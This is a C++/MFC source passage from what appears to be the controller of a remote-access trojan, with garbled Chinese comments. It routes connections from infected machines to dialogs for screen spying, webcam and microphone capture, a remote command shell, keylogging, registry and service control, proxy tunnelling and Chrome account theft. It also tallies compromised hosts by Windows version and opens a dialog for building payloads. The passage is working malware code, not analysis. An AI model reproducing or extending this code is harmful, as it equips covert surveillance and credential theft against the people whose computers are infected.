	case TOKEN_BITMAPINFO: // ÆÁÄ»²é¿´1
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO1: // ÆÁÄ»²é¿´2
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG1, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ÉãÏñÍ·
		g_pFrame->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // ÓïÒô
		g_pFrame->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START: //¿ªÊ¼CMD
		g_pFrame->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:     // ÏµÍ³¹ÜÀí ½ø³ÌÁÐ±í
		g_pFrame->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_FIND_YES: // É¸Ñ¡´æÔÚ
		g_pFrame->PostMessage(WM_MODIFYLIST, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pFrame->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SERVICE_LIST:
		g_pFrame->PostMessage(WM_OPENSERVICEDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:   //×¢²á±í¹ÜÀí    
		g_pFrame->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_TEXTCHAT_START:
		g_pFrame->PostMessage(WM_OPENTEXTCHATDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PROXY_START:
		g_pFrame->PostMessage(WM_OPENPROXYMAPDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_CHROME_INFO:		//CHROMEÕÊºÅ    
		g_pFrame->PostMessage(WM_OPENCHROMEDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_CHAT_START:
		g_pFrame->PostMessage(WM_OPENCHATDIALOG, 0, (LPARAM)pContext);
		break;
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}


// ÐèÒªÏÔÊ¾½ø¶ÈµÄ´°¿Ú
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// Èç¹û¹ÜÀí¶Ô»°¿ò´ò¿ª£¬½»¸øÏàÓ¦µÄ¶Ô»°¿ò´¦Àí
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// ½»¸ø´°¿Ú´¦Àí
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case SCREENSPY_DLG1:
			((CScreenSpyDlgs *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{	
	m_TrayIcon.ShowBalloonTip( lpszText, _T("ÐÂÉÏÏßÖ÷»úÐÅÏ¢: "), NIIF_INFO, 10);
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str,strTemp;

	int a = 0;
	CPcView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{	
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		a += pView->m_pListCtrl->GetItemCount();
	}

	strTemp.Format(_T("ºÏ¼Æ: %d"), a);

	str.Format(_T("Else:%d   2000:%d   XP:%d   2003:%d   Vista:%d   2008:%d   Win7:%d   Win8:%d   2012:%d   Win10:%d   2016:%d    %s"), 
		nOSCount[0],
		nOSCount[1], 
		nOSCount[2],
		nOSCount[3],
		nOSCount[4],
		nOSCount[5],
		nOSCount[6],
		nOSCount[7],
		nOSCount[8],
		nOSCount[9],
		nOSCount[10],
		strTemp);

	m_wndStatusBar.SetPaneText(0, str);

	UpdateData(); 

	g_pFrame->m_TrayIcon.SetTooltipText(strTemp);
}

void CMainFrame::OnCustomize()
{
	// get a pointer to the command bars object.
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if (pCommandBars == NULL)
		return;
	
	// instanciate the customize dialog
	CXTPCustomizeSheet dlg(pCommandBars);
	
	// add the options page to the customize dialog.
	CXTPCustomizeOptionsPage pageOptions(&dlg);
	dlg.AddPage(&pageOptions);
	
	// add the commands page to the customize dialog.
	CXTPCustomizeCommandsPage* pPageCommands = dlg.GetCommandsPage();
	pPageCommands->AddCategories(IDR_MAINFRAME);
	
	// initialize the commands page page.
	pPageCommands->InsertAllCommandsCategory();
	pPageCommands->InsertBuiltInMenus(IDR_MAINFRAME);
	pPageCommands->InsertNewMenuCategory();
	
	// display the customize dialog.
	dlg.DoModal();
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		m_TrayIcon.MinimizeToTray(this);
		m_TrayIcon.ShowBalloonTip( _T("Running......"), _T("×îÐ¡»¯"), NIIF_NONE, 10);
	}
	else
	{
		CXTPFrameWnd::OnSysCommand(nID, lParam);
	}
}

void CMainFrame::OnMenuitemShow() 
{
	// TODO: Add your command handler code here
	if (!IsWindowVisible()){
        m_TrayIcon.MaximizeFromTray(this);
	}else
		m_TrayIcon.MinimizeToTray(this);
}

void CMainFrame::OnMenuitemHide() 
{
	// TODO: Add your command handler code here
	m_TrayIcon.MinimizeToTray(this);
}

void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
#ifdef NDEBUG
	if(m_bSetRestart == NULL)  //Õý³£¹Ø±Õ
	{
		int iResult = MessageBox("ÄúÈ·ÈÏÒªÍË³ö£¿£¿£¿", " ÎÂÜ°ÌáÊ¾£¡", MB_ICONQUESTION|MB_YESNO);
		if(iResult != IDYES)
			return ;
		AnimateWindow(GetSafeHwnd(),300,AW_HIDE|AW_BLEND);    //ÒõÓ°Ð§¹û
	}
	else   //Èí¼þÖØÆô
	{
		char pBuf[MAX_PATH];
		//»ñÈ¡Ó¦ÓÃ³ÌÐòÍêÈ«Â·¾¶
		GetModuleFileName(NULL,pBuf,MAX_PATH);
		
		STARTUPINFO startupinfo;
		PROCESS_INFORMATION proc_info;
		
		memset(&startupinfo,0,sizeof(STARTUPINFO));
		startupinfo.cb=sizeof(STARTUPINFO);
		::CreateProcess(pBuf,NULL,NULL,NULL,FALSE,NORMAL_PRIORITY_CLASS,NULL,NULL,&startupinfo,&proc_info);
	}
#endif

	//Ïú»Ù»¥³â¶ÔÏó£¬ÊÍ·Å×ÊÔ´
	CloseHandle(m_mutex);

	KillTimer(0);  //¹Ø±Õ¶¨Ê±Æ÷ 

// 	RECT rect;
// 	::GetWindowRect(GetSafeHwnd(),&rect);
// 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("CLIENT", "Width",  rect.right - rect.left);
// 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("CLIENT", "Hight",  rect.bottom - rect.top);
	

	SaveCommandBars("CommandBars");

	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	pMainFrame->m_TrayIcon.RemoveIcon();
	
	if (NULL!=m_iocpServer)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}

	if (hModule_shell32)
	{
		FreeLibrary(hModule_shell32);
	}

	if (lpFilePacket)
	{
		delete [] lpFilePacket;
	}
	if (lpShellPacket)
	{
		delete [] lpShellPacket;
	}
	if (lpScreenPacket)
	{
		delete [] lpScreenPacket;
	}
	if (lpWebCamPacket)
	{
		delete [] lpWebCamPacket;
	}
	if (lpAudioPacket)
	{
		delete [] lpAudioPacket;
	}
	if (lpSystemPacket)
	{
		delete [] lpSystemPacket;
	}
	if (lpKeyboardPacket)
	{
		delete [] lpKeyboardPacket;
	}
	if (lpServicePacket)
	{
		delete [] lpServicePacket;
	}
	if (lpRegeditPacket)
	{
		delete [] lpRegeditPacket;
	}
	if (lpTextChatPacket)
	{
		delete [] lpTextChatPacket;
	}
	if (lpProxyMapPacket)
	{
		delete [] lpProxyMapPacket;
	}

	CXTPFrameWnd::OnClose();
}

void CMainFrame::OnMenuitemSetting() 
{
	// TODO: Add your command handler code here
	CSettingDlg dlg;
	dlg.DoModal();
}

void CMainFrame::OnMenuitemBuild() 
{
	// TODO: Add your command handler code here
	CBuildDlg dlg;
	dlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////

LRESULT CMainFrame::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	
	CPcView* pView = NULL;
	CString strOSCount,strLogText;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	bool bIsOk = false;
	
	// 	try
	// 	{
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		// É¾³ýÁ´±í¹ý³ÌÖÐ¿ÉÄÜ»áÉ¾³ýpContext (ËùÒÔ²»ÄÜÊ¹ÓÃpContextÀïµÄÊý¾Ý£¬Ëµ»°ËµÒ»°ë) 
		
		int nCnt = pView->m_pListCtrl->GetItemCount();
		for (int i=0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
			{
				bIsOk = true;
				CString strLogText,strTemp,strGroupName;
				
				strTemp = g_pTabView->m_wndTabControl.GetItem(n)->GetCaption();
				int n = strTemp.ReverseFind('(');
				if ( n > 0 )
				{
					strGroupName = strTemp.Left(n);
				}
				else
				{
					strGroupName = strTemp;
				}
				//¼ÓÈëÈÕÖ¾ÁÐ±í
				strLogText.Format(_T("Ö÷»úÏÂÏß:[%s] - ¼ÆËã»ú/±¸×¢:[%s] - ÉÏÏß·Ö×é:[%s] - ÍâÍøIP:[%s]"),
					pView->m_pListCtrl->GetItemText(i, 0), //ÇøÓò
					pView->m_pListCtrl->GetItemText(i, 3),  //Ö÷»úÃû
					strGroupName,              //ÉÏÏß·Ö×é
					pView->m_pListCtrl->GetItemText(i, 1)); //ÍâÍøIP
				g_pLogView->InsertLogItem(strLogText, 0, 2);
				
				strOSCount = pView->m_pListCtrl->GetItemText( i, 4 );
				if ( strOSCount.Find(_T("NT")) != -1 )
				{
					g_pFrame->nOSCount[0]--;
				}
				if ( strOSCount.Find(_T("XP")) != -1 )
				{
					g_pFrame->nOSCount[2]--;
				}
				if ( strOSCount.Find(_T("Vista")) != -1 )
				{
					g_pFrame->nOSCount[4]--;
				}
				if ( strOSCount.Find(_T("Win 7")) != -1 )
				{
					g_pFrame->nOSCount[6]--;
				}
				if ( strOSCount.Find(_T("2000")) != -1 )
				{
					g_pFrame->nOSCount[1]--;
				}
				if ( strOSCount.Find(_T("2003")) != -1 )
				{
					g_pFrame->nOSCount[3]--;
				}
				if ( strOSCount.Find(_T("2008")) != -1 )
				{
					g_pFrame->nOSCount[5]--;
				}
				if ( strOSCount.Find(_T("Win 8")) != -1 )
				{
					g_pFrame->nOSCount[7]--;
				}
				if ( strOSCount.Find(_T("2012")) != -1 )
				{
					g_pFrame->nOSCount[8]--;
				}
				if ( strOSCount.Find(_T("Win 10")) != -1 )
				{
					g_pFrame->nOSCount[9]--;
				}
				if ( strOSCount.Find(_T("2016")) != -1 )
				{
					g_pFrame->nOSCount[10]--;
				}
				
				pView->m_pListCtrl->DeleteItem(i);
				
				if (!((CClientApp *)AfxGetApp())->m_bIsWarning_Tone)
				{
					PlaySound(MAKEINTRESOURCE(IDR_WAVE_OFFLINE),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
				}
				break;		
			}
		}		
	}

	if(bIsOk == false)
		TRACE("Ã»ÓÐÕÒµ½ÒªÉ¾³ýµÄÖ÷»ú\r\n");
	
	// ¹Ø±ÕÏà¹Ø´°¿Ú
	switch (pContext->m_Dialog[0])
	{ 
	case FILEMANAGER_DLG:
	case SCREENSPY_DLG:
	case SCREENSPY_DLG1:
	case SHELL_DLG:
	case WEBCAM_DLG:
	case AUDIO_DLG:
	case SYSTEM_DLG:
	case KEYBOARD_DLG:
	case SERVICE_DLG:
	case REGEDIT_DLG:
	case CHAT_DLG:
	case CHAT_DLG1:
	case PROXYMAP_DLG:
		((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
		return 0;
	default:
		break;
	}
	
	// 	}
	// 	catch(...)
	// 	{
	// 		TRACE("ÏÂÏßÉ¾³ýcatch\r\n");
	// 	}
	
	// ¸üÐÂµ±Ç°Á¬½Ó×ÜÊý
	g_pTabView->UpDateNumber();
	ShowConnectionsNumber();
	
	return 0;
}

LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	
	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_DIALOG_SCREENSPY, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
	

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}
LRESULT CMainFrame::OnOpenScreenSpyDialog1(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	
	CScreenSpyDlgs	*dlg = new CScreenSpyDlgs(this, m_iocpServer, pContext);
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_DIALOG_SCREENSPY1, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
	
	
	pContext->m_Dialog[0] = SCREENSPY_DLG1;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}
LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{	
	ClientContext *pContext = (ClientContext *)lParam;
	
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

LRESULT CMainFrame::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_DIALOG_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenServiceDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CServiceDlg	*dlg = new CServiceDlg(this, m_iocpServer, pContext);
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_DIALOG_SERVICE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = SERVICE_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);
	
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_DIALOG_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnModifyList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return 0;
	
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	
	int nCount = pView->m_pListCtrl->GetItemCount();
	
	for (int i=0; i < nCount; i++)
	{
		if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
		{
			CString str, strTemp;
			
			str = pView->m_pListCtrl->GetItemText(i,4);
			int n = str.Find("*");
			if (n == 0)
			{
				str = str.Right(str.GetLength() - 1);
			}
			strTemp = "*";
			strTemp += str;
			
			pView->m_pListCtrl->SetItemText(i,4,strTemp);
			
			break;
		}
	}
	
	return 0;
}




CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
	//×ö¸ö±ê¼Ç
	int nID = ++m_nCount;
	
	CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);
	
	CString strTitle;
	strTitle.Format(strFormat, nID);
	pwndPane->SetTitle(strTitle);
	pwndPane->SetIconID(nID % 6 + 1);
	
	CFrameWnd* pFrame = new CFrameWnd;
	
	CCreateContext context;
	context.m_pNewViewClass = pNewViewClass;
	context.m_pCurrentDoc = GetActiveView()->GetDocument();
	

	pFrame->Create(NULL, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
	pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);
	
	m_mapPanes.SetAt(nID, pFrame);
	
	return pwndPane;
}



LRESULT CMainFrame::OnOpenTextChatDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CTextChatDlg	*dlg = new CTextChatDlg(this, m_iocpServer, pContext);
/*
	CInputDialog Indlg;
	Indlg.Init("ÇëÊäÈëÁÄÌìêÇ³Æ", _T("µãÈ¡ÏûÄ¬ÈÏêÇ³ÆÎªHacker:"), this);
	if (Indlg.DoModal() != IDOK)   
		dlg->strName = "Hacker:\r\n"; 
	else
		dlg->strName.Format("%s:\r\n",Indlg.m_str.GetBuffer(0)); */
 
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_DIALOG_TEXTCHAT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = CHAT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)    //×¢²á±í
{
    ClientContext	*pContext = (ClientContext *)lParam;
	CRegeditDlg	*dlg = new CRegeditDlg(this, m_iocpServer, pContext);
	//ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
    dlg->Create(IDD_DIALOG_REGEDIT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenProxyMapDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CProxyMapDlg	*dlg = new CProxyMapDlg(this, m_iocpServer, pContext);
	
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_DIALOG_PROXY_MAP, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = PROXYMAP_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}
LRESULT CMainFrame::OnOpenChromeDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CChromeDlg	*dlg = new CChromeDlg(this, m_iocpServer, pContext);
	//Settings¸¸´°¿ÚÎª×ÀÃæ
	dlg->Create(IDD_DIALOG_CHROME, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	//pContext->m_Dialog[0] = REGEDIT_DLG;
	//pContext->m_Dialog[1] = (int)dlg;
	return 0;
}
LRESULT CMainFrame::OnOpenChatDialog(WPARAM wParam, LPARAM lParam) // ¼ôÇÐ°å
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CMyChat	*dlg = new CMyChat(this, m_iocpServer, pContext);
	
	// ÉèÖÃ¸¸´°¿ÚÎª×¿Ãæ
	dlg->Create(IDD_CHAT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = CHAT_DLG1;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}
void CMainFrame::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	switch(nIDEvent)
	{
	case 0:
		{
			CString str;
			str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
			m_wndStatusBar.SetPaneText(1, str);
			m_iocpServer->m_nSendKbps = 0;
			m_iocpServer->m_nRecvKbps = 0;
		}
		break;
	default:
		break;
	}
	
	CXTPFrameWnd::OnTimer(nIDEvent);
}

LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
	if (wParam == XTP_DPN_SHOWWINDOW)
	{
		// get a pointer to the docking pane being shown.
		CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
		if (!pPane->IsValid())
		{
			CWnd* pWnd = NULL;
			if (m_mapPanes.Lookup(pPane->GetID(), pWnd))
			{
				pPane->Attach(pWnd);
			}
		}
		return TRUE; // handled
	}
	return FALSE;
}

void CMainFrame::OnHackerTools() 
{
	// TODO: Add your command handler code here
	CHackerTools dlg;
	dlg.DoModal();
}
void CMainFrame::OnSz()
{
}
